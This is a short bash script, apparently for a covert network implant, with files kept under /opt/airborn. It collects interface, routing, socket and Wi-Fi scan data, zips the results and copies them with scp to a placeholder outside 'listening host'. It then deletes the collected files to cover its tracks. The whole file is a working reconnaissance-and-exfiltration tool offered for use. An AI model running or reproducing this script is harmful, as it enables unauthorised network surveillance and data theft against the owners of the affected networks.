#!/bin/bash

# TODO: Check for internet connectivity
# TODO: Implement logging

# Enumerate network and store output
ifconfig >> /opt/airborn/ifconfig.txt
ip route >> /opt/airborn/iproute.txt
netstat -lanp >> /opt/airborn/netstat.txt
iwlist wlan0 scanning >> /opt/airborn/iwlist.txt
zip /opt/airborn/recon.zip /opt/airborn/ifconfig.txt /opt/airborn/iproute.txt /opt/airborn/netstat.txt /opt/airborn/iwlist.txt

# SCP recon'd files to listening host
/usr/bin/scp -i $yourSSHKey /opt/airborn/recon.zip $user@$yourListeningHost:$yourPath/. && echo 'ssh success!' >> /opt/airborn/ssh_log.txt 

rm /opt/airborn/*.txt
rm /opt/airborn/*.zip
touch /opt/airborn/done
